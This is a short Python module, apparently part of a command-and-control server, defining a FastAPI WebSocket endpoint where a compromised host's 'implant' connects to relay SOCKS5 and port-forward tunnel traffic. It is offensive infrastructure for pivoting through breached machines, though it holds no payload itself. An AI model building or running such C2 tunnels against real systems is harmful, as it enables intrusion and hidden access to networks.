"""WS tunnel endpoint — implant connects here for SOCKS5 / portfwd sessions."""

import logging
from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from ...storage import set_tunnel_session_active, set_tunnel_session_closed

router = APIRouter(tags=["tunnel"])
logger = logging.getLogger(__name__)


@router.websocket("/c2/tunnel/{tunnel_type}/{session_id}")
async def tunnel_ws(ws: WebSocket, tunnel_type: str, session_id: str):
    tunnel_mgr = ws.app.state.tunnel_manager
    sess = await tunnel_mgr.register_ws(session_id, ws)
    if sess is None:
        await ws.close(code=4004, reason="unknown session")
        return
    await ws.accept()
    await set_tunnel_session_active(session_id, sess.local_port)
    logger.info(f"Tunnel WS up: {tunnel_type} session={session_id[:8]} port={sess.local_port}")
    try:
        while True:
            data = await ws.receive_bytes()
            await tunnel_mgr.relay_from_implant(session_id, data)
    except WebSocketDisconnect:
        logger.info(f"Tunnel WS disconnected: {session_id[:8]}")
    except Exception as e:
        logger.error(f"Tunnel WS error {session_id[:8]}: {e}")
    finally:
        await tunnel_mgr.close_session(session_id)
        await set_tunnel_session_closed(session_id)
